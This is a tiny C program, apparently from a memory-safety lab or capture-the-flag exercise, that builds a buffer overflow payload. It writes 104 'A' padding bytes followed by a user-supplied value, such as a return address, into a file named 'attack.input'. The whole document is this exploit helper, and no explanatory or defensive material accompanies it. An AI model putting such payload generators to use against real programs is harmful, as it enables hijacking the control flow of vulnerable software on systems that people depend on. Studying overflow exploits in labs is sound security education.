#include <stdio.h>
int main(int argc, char* argv[])
{
	FILE* fp = fopen("attack.input","w+");
	for(int i=0;i<104;i++){
		fputc('A',fp);
	}
	fputs(argv[1] ,fp);
	fclose(fp);
	return 0;
}
